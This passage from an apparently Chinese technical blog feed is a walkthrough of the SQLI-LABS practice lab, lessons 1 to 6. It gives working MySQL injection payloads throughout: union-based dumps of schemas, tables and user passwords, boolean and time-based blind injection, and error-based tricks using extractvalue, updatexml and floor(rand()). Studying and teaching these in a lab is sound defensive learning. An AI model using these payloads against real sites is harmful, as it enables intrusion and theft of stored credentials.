<h2 id="4、-类型转换函数"><a href="#4、-类型转换函数" class="headerlink" title="4、 类型转换函数"></a>4、 类型转换函数</h2><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cast</span>(<span class="built_in">expr</span>,<span class="type">AS</span> <span class="keyword">type</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>expr是要转化的值，type是转换后的数据类型，类型有<em>binary</em> , <em>char</em> , <em>date</em> , <em>date</em> , <em>time</em> , <em>datetime</em> , <em>signed</em> , <em>unsigned</em> 。</p>
</blockquote>
<h2 id="5、-控制流函数"><a href="#5、-控制流函数" class="headerlink" title="5、 控制流函数"></a>5、 控制流函数</h2><h3 id="1、-ifnull-和-nullif-函数"><a href="#1、-ifnull-和-nullif-函数" class="headerlink" title="1、 ifnull() 和 nullif() 函数"></a>1、 <em>ifnull()</em> 和 <em>nullif()</em> 函数</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">ifnull</span><span class="params">(expr1,expr2)</span></span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>判断参数expr1是否为null，如果expr1为null，则返回expr2，否则返回expr1。</p>
</blockquote>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">nullif</span><span class="params">(expr1,expr2)</span></span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>判断两个参数是否相等，如果相等返回null，否则返回第一个参数。</p>
</blockquote>
<h3 id="2、-if-函数"><a href="#2、-if-函数" class="headerlink" title="2、 if() 函数"></a>2、 <em>if()</em> 函数</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(expr1,expr2,expr3)</span></span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>函数会判断expr1是否为真，如果表达式为真则返回第二个参数，如果为假返回第三个参数。</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 资料 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLI-LABS(Less1-Less10)]]></title>
      <url>/2018/02/04/sqli-labs1/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>寒假无聊，加上最近也正好在学习数据库，所以顺便做一下sql注入天书SQLI-LABS，安装的话网上有很多的教程，按照教程的步骤做就可以。<br><a id="more"></a></p>
<h1 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h1><p>我们先使用一下系统数据库<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">information_schema</span>;</span><br></pre></td></tr></table></figure></p>
<p><img src="sqli-labs1/1.png" alt=""></p>
<p>使用一下这个查询<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema = <span class="string">"security"</span>;</span><br></pre></td></tr></table></figure></p>
<p>这样的话可以得到表名列表</p>
<p>所以可以利用<code>information_schema</code> 进行一次完整的注入，以下为一般流程：</p>
<p>猜数据库<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schemata;</span><br></pre></td></tr></table></figure></p>
<p>猜某库的数据表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information.tables <span class="keyword">where</span> table_schema=<span class="string">'xxx'</span>;</span><br></pre></td></tr></table></figure>
<p>猜表的所有列</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'xxx'</span>;</span><br></pre></td></tr></table></figure>
<p>查找某列的内容<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *** <span class="keyword">from</span> ***;</span><br></pre></td></tr></table></figure></p>
<hr>
<h1 id="LESS-1"><a href="#LESS-1" class="headerlink" title="LESS-1"></a>LESS-1</h1><p>这是我的第一关，所以要详细一点。<br>打开界面</p>
<blockquote>
<p>Please input the ID as parameter with numeric value</p>
</blockquote>
<p>题目提示我输入ID，尝试输入<code>id=1’</code>，发现报错。</p>
<blockquote>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
</blockquote>
<p>发现是单引号未闭合，输入<code>?id=1’—+</code> 即可正常回显，接下来是爆字段</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' or <span class="number">1</span>=<span class="number">1</span> order by <span class="number">1</span>,<span class="number">2</span>--+</span><br></pre></td></tr></table></figure>
<p>不断增加 <em>order by</em> 后面的数字，直到报错，到了4的时候报错，说明该表有三个字段。接下来使用union查询</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>
<p>这个<code>1,2,3</code> 只是为了保证 <em>union</em> 前后两个语句的列数相同，至于<code>id=-1</code> 则是为了使前一个查询无返回结果从而返回第二个 <em>select</em> 的查询结果。只需要将数字替换为相应的想要查询的信息即可，比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">user</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>这样可以得到函数名，数据库名等信息。</p>
<p>这里列举几个常用的函数：</p>
<p><strong><em>系统函数：</em></strong></p>
<blockquote>
<p><strong>database()：</strong>数据库名<br><strong>version()：</strong> 数据库版本<br><strong>user()：</strong> 数据库用户名<br><strong>@@datadir：</strong> 数据库路径<br><strong>@@version_compile_os：</strong> 操作系统版本</p>
</blockquote>
<p><strong><em>字符串连接函数：</em></strong></p>
<blockquote>
<p><strong>concat(str1,str2,…)：</strong> 没有分隔符地连接字符串<br><strong>concat_ws(sep,str1,str2,…)：</strong> 含有分隔符的连接字符串，sep为分隔符，由ASCII码指定<br><strong>group_concat(str1,str2,…)：</strong> 连接一个组的所有字符串，中间以逗号隔开。</p>
</blockquote>
<p>利用系统数据库爆库名：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>爆表名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>爆列名</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1'union select 1,group_concat(column_name),3 <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>--+</span><br></pre></td></tr></table></figure>
<p>爆数据</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1'union select 1,username,password <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=3--+</span><br></pre></td></tr></table></figure>
<h1 id="LESS-2"><a href="#LESS-2" class="headerlink" title="LESS-2"></a>LESS-2</h1><p>尝试<code>?id=1’</code> 报错</p>
<blockquote>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p>
</blockquote>
<p>发现是单引号出现了奇数次，查看源代码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
<p>是直接传递变量，所以直接传参数即可<code>?id=-1 union select 1,database(),version()</code></p>
<p>接下来过程与第一个一样。</p>
<h1 id="LESS-3"><a href="#LESS-3" class="headerlink" title="LESS-3"></a>LESS-3</h1><p>尝试<code>?id=1’</code>，得到报错信息：</p>
<blockquote>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1</p>
</blockquote>
<p>可见是单引号后面加括号形成的查询语句，构造语句形成闭合<code>?id=1’)—+</code> 即可进行查询。</p>
<h1 id="LESS-4"><a href="#LESS-4" class="headerlink" title="LESS-4"></a>LESS-4</h1><p>尝试<code>?id=1”</code>，得到报错信息：</p>
<blockquote>
<p> use near ‘“1””) LIMIT 0,1’ at line 1</p>
</blockquote>
<p>可知是双引号和括号的闭合，构造payload：<code>?id=1”)—+</code></p>
<p><strong>小结</strong></p>
<blockquote>
<p>1-4关比较简单，错误也有回显，主要是引号括号等的闭合问题。</p>
</blockquote>
<hr>
<p>第五关开始需要进行盲注，因为页面不再返回错误信息。</p>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><em>盲注</em></h1><p><strong>盲注</strong> 是指在SQL注入的过程中，执行选择的语句不会正确回显到前段页面，需要我们利用一些方法判断或尝试，这个过程称为盲注。</p>
<h2 id="一、基于布尔的SQL盲注—构造逻辑判断"><a href="#一、基于布尔的SQL盲注—构造逻辑判断" class="headerlink" title="一、基于布尔的SQL盲注—构造逻辑判断"></a>一、基于布尔的SQL盲注—构造逻辑判断</h2><h3 id="1、left-函数"><a href="#1、left-函数" class="headerlink" title="1、left()函数"></a>1、left()函数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(database(),1)&gt;'s'           //left()函数</span><br></pre></td></tr></table></figure>
<blockquote>
<p><em>left(a,b)</em> 从左截取a的前b位</p>
</blockquote>
<h3 id="2、ascii-，substr-函数"><a href="#2、ascii-，substr-函数" class="headerlink" title="2、ascii()，substr()函数"></a>2、ascii()，substr()函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((<span class="keyword">select</span> table_name information_schema.tables <span class="keyword">where</span> tables_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><em>substr(a,b,c)</em>  从b位置开始，截取字符串a的c长度，<em>ascii()</em> 将单个字符转换为ascii码值</p>
</blockquote>
<h3 id="3、ascii-函数"><a href="#3、ascii-函数" class="headerlink" title="3、ascii()函数"></a>3、ascii()函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">98</span></span><br></pre></td></tr></table></figure>
<h3 id="4、ord-函数"><a href="#4、ord-函数" class="headerlink" title="4、ord()函数"></a>4、ord()函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord(mid((<span class="keyword">select</span> <span class="keyword">ifnull</span>(<span class="keyword">cast</span>(username <span class="keyword">as</span> <span class="built_in">char</span>),<span class="number">0x20</span>) <span class="keyword">from</span> security.users <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">98</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><em>mid(a,b,c)</em> 从位置b开始，截取a字符串的c位<br><em>ord()</em> 函数与ascii函数相同。</p>
</blockquote>
<h3 id="5、regexp正则注入"><a href="#5、regexp正则注入" class="headerlink" title="5、regexp正则注入"></a>5、regexp正则注入</h3><p><code>select user() regexp ‘^[a-z]’;</code>，这样会匹配user为root，如果正确返回1，那么<code>… regexp ‘^ro’</code> 则可以匹配第二位。</p>
<h3 id="6、like匹配注入"><a href="#6、like匹配注入" class="headerlink" title="6、like匹配注入"></a>6、like匹配注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">'ro%'</span>;</span><br></pre></td></tr></table></figure>
<h2 id="二、基于报错的注入"><a href="#二、基于报错的注入" class="headerlink" title="二、基于报错的注入"></a>二、基于报错的注入</h2><h3 id="1、concat-计数报错"><a href="#1、concat-计数报错" class="headerlink" title="1、concat()计数报错"></a>1、concat()计数报错</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))  a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure>
<p><em>explain</em></p>
<blockquote>
<p>需要注意三个点，一是需要concat()计数，二是floor，取得0 or1 ，进行数据的重复，三是<code>group by</code> 进行分组，此处会报错好像是因为MySQL的一个bug，<code>rand()</code> 有时候需要多试几次。</p>
</blockquote>
<p>如果关键的表被禁用的话，可以使用下面的方法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span> <span class="keyword">union</span> <span class="keyword">select</span> !<span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
<p>如果rand被禁用了可以使用用户变量来报错</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">min</span>(@a:=<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">password</span>,@a:=(@a+<span class="number">1</span>)%<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<h3 id="2、exp"><a href="#2、exp" class="headerlink" title="2、exp()"></a>2、exp()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())a))  //<span class="keyword">double</span>数值类型超出范围</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>exp()</code> 函数为以e为底的对数函数，版本在5.5.5及其之上，本例利用了exp报错</p>
</blockquote>
<h3 id="3、-0"><a href="#3、-0" class="headerlink" title="3、~0"></a>3、~0</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> !(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x) - ~<span class="number">0</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>bigint</code>类型超出范围，<code>~0</code> 是对0按位取反。</p>
</blockquote>
<h3 id="4、-xpath"><a href="#4、-xpath" class="headerlink" title="4、 xpath"></a>4、 xpath</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">extractvalue</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7a,(select <span class="variable">@@version</span>),<span class="number">0</span>x7e)) <span class="comment">//MySQL对XML数据进行修改的xpath函数，xpath语法错误。</span></span><br></pre></td></tr></table></figure>
<h3 id="5、xpath"><a href="#5、xpath" class="headerlink" title="5、xpath"></a>5、xpath</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) //与第<span class="number">4</span>个相同原理</span><br></pre></td></tr></table></figure>
<h3 id="6、重复特性"><a href="#6、重复特性" class="headerlink" title="6、重复特性"></a>6、重复特性</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>))x; //mysql重复特性，此处重复了version，所以报错。</span><br></pre></td></tr></table></figure>
<h2 id="基于时间的SQL盲注"><a href="#基于时间的SQL盲注" class="headerlink" title="基于时间的SQL盲注"></a>基于时间的SQL盲注</h2><h3 id="1、sleep-函数"><a href="#1、sleep-函数" class="headerlink" title="1、sleep()函数"></a>1、sleep()函数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))# //if判断语句，条件为假，执行sleep</span><br></pre></td></tr></table></figure>
<h3 id="2、benchmark-函数"><a href="#2、benchmark-函数" class="headerlink" title="2、benchmark()函数"></a>2、benchmark()函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(substring(current,1,1)=char(115),benchmark(50000000,encode('MSG','by 5 seconds')),null)</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="LESS-5"><a href="#LESS-5" class="headerlink" title="LESS-5"></a>LESS-5</h1><p>尝试<code>?id=1’</code>,得到报错信息：</p>
<blockquote>
<p>use near ‘’1’’ LIMIT 0,1’ at line 1</p>
</blockquote>
<p>可知是单引号未闭合，构造payload：<code>?id=1’—+</code>，在盲注过程中，页面返回<code>You are in</code> 的时候才说明没有报错，反之则说明错误。</p>
<h2 id="1、盲注四连"><a href="#1、盲注四连" class="headerlink" title="1、盲注四连"></a>1、盲注四连</h2><h3 id="1、利用-left-函数得到数据库名"><a href="#1、利用-left-函数得到数据库名" class="headerlink" title="1、利用 left() 函数得到数据库名"></a><strong>1、利用 <em>left()</em> 函数得到数据库名</strong></h3><p>此时想得到信息可以尝试<code>?id=1’ and left(version(),1)=5—+</code> 如果版本号第一个数字是5则会返回<code>You are in</code>，如果错误的话则不能正确的返回信息，比如<code>?id=1’ and left(version(),1)=6—+</code>，则无法正确回显。继续进行下去可以盲注出更多信息<code>?id=1’ and left(version(),4)=concat(‘5.7.’)—+</code> 。</p>
<p>看一下数据库名的长度<code>?id=1’ and length(database())=8—+</code>，可以正确回显，说明数据库名长度就是8，接下来爆数据库名<code>?id=1’ and left(database(),1)&gt;’a’—+</code>，这个数据库第一个字母是s，显然成立，具体不知道时可以用二分法，接下来爆第二位<code>?id=1’ and left(database(),2)&gt;’sa’—+</code> 可以一步步爆出所有字段。</p>
<h3 id="2、利用-substr-ascii-函数得到表名"><a href="#2、利用-substr-ascii-函数得到表名" class="headerlink" title="2、利用 substr() , ascii() 函数得到表名"></a><strong>2、利用 <em>substr()</em> , <em>ascii()</em> 函数得到表名</strong></h3><p>前面已经得到数据库名为<code>security</code> ，接下里爆表：<code>?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101—+</code> ，当然，这里的 <code>database()</code> 也可以换成 <code>security</code> ，作用是相同的。一步步改变 <code>substr()</code>即可爆出第一个表为 <code>emails</code>。改变 <code>limit()</code> 参数即可爆出所有表。此处也可以不用 <code>ascii()</code> 函数，<code>?id=1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,2)=’ea’</code> 同样可以实现要求。</p>
<h3 id="3、利用-regexp-函数得到列名"><a href="#3、利用-regexp-函数得到列名" class="headerlink" title="3、利用 regexp() 函数得到列名"></a><strong>3、利用 <em>regexp()</em> 函数得到列名</strong></h3><p>接下来爆users表的列名，<code>?id=1’ and 1=(select 1 from information_schema.columns where table_name=’user’ and column_name regexp ‘username’ limit 0,1)—+</code>，改变 <code>regexp()</code> 参数即可继续爆出其他列名。</p>
<h3 id="4、利用-ord-和-mid-函数得到user表中的内容"><a href="#4、利用-ord-和-mid-函数得到user表中的内容" class="headerlink" title="4、利用 ord() 和 mid() 函数得到user表中的内容"></a><strong>4、利用 <em>ord()</em> 和 <em>mid()</em> 函数得到user表中的内容</strong></h3><p><em>ord()</em> 和 <em>ascii()</em> 作用相同， <em>mid()</em> 和 <em>substr()</em> 作用相同，爆表内容：<code>?id=1’ and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68—+</code>，当然，还有一个简化一点的<code>?id=1’ and binary mid((select username from security.users order by id limit 0,1),1,3)=’Dum’—+</code> ，我比较推荐这个，这个更简单一点。这样就可以得到表中的所有内容了。<code>binary</code> 关键字可以在比较时区分大小写。</p>
<p>经过这四步就可以得到整个表的信息了。</p>
<h2 id="2、报错注入"><a href="#2、报错注入" class="headerlink" title="2、报错注入"></a>2、报错注入</h2><h3 id="1、-concat-计数报错"><a href="#1、-concat-计数报错" class="headerlink" title="1、 concat() 计数报错"></a>1、 <em>concat()</em> 计数报错</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>页面会返回</p>
<blockquote>
<p>Duplicate entry ‘::root@localhost::0’ for key ‘’</p>
</blockquote>
<p>这样就可以得到数据库名等信息。报错原因待研究</p>
<h3 id="2、-基于double类型溢出进行报错"><a href="#2、-基于double类型溢出进行报错" class="headerlink" title="2、 基于double类型溢出进行报错"></a>2、 基于double类型溢出进行报错</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> (<span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">database</span>()) a ))),<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>返回</p>
<blockquote>
<p>DOUBLE value is out of range in ‘exp(~((select <code>a</code>.<code>user()</code> from (select user() AS <code>user()</code>) <code>a</code>)))’</p>
</blockquote>
<p>很遗憾，我的报错没有返回信息，很痛苦。还需要在研究</p>
<h3 id="3、-使用bigint溢出进行报错"><a href="#3、-使用bigint溢出进行报错" class="headerlink" title="3、 使用bigint溢出进行报错"></a>3、 使用bigint溢出进行报错</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> (!(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x) - ~<span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>依然没成功，可能是版本的问题</p>
<h3 id="4、xpath函数报错注入"><a href="#4、xpath函数报错注入" class="headerlink" title="4、xpath函数报错注入"></a>4、xpath函数报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>页面返回</p>
<blockquote>
<p>XPATH syntax error: ‘~5.7.14~’</p>
</blockquote>
<p>得到版本信息。</p>
<p>利用继续注入可以得到表名等信息<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>后面不在赘述</p>
<p>还有一种方法<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>和第一个效果一样。</p>
<h3 id="5、-利用数据的重复性"><a href="#5、-利用数据的重复性" class="headerlink" title="5、 利用数据的重复性"></a>5、 利用数据的重复性</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>), <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>() ,<span class="number">1</span>))x<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p> 这个貌似只能爆出数据库版本，我尝试爆数据库名什么的都不行。 </p>
<blockquote>
<p><em>NAME_CONST(name,value)</em>：用于生成结果集列时，NAME_CONST()会使列具有给定的名称name。参数value应该是常数。</p>
</blockquote>
<h2 id="3、延时注入"><a href="#3、延时注入" class="headerlink" title="3、延时注入"></a>3、延时注入</h2><h3 id="1、利用-sleep-函数进行注入"><a href="#1、利用-sleep-函数进行注入" class="headerlink" title="1、利用 sleep() 函数进行注入"></a>1、利用 <em>sleep()</em> 函数进行注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(ascii(substr(database(),1,1))=116,1,sleep(5))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h3 id="2、利用-benchmark-进行延时注入"><a href="#2、利用-benchmark-进行延时注入" class="headerlink" title="2、利用 benchmark() 进行延时注入"></a>2、利用 <em>benchmark()</em> 进行延时注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'union <span class="keyword">select</span> (<span class="keyword">if</span>(<span class="keyword">substring</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">115</span>),<span class="keyword">benchmark</span>(<span class="number">50000000</span>,<span class="keyword">encode</span>(<span class="string">'MSG'</span>,<span class="string">'by 5 seconds'</span>)),<span class="literal">null</span>)),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tb1<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>如果正确的话就会函数就会执行一段时间才返回。</p>
<p>至此，各种盲注都演示了一遍。</p>
<h1 id="LESS-6"><a href="#LESS-6" class="headerlink" title="LESS-6"></a>LESS-6</h1><p>单引号闭合变成了双引号闭合，payload：<code>?id=1”—+</code>，后面的话跟第五关一样。</p>
<hr>
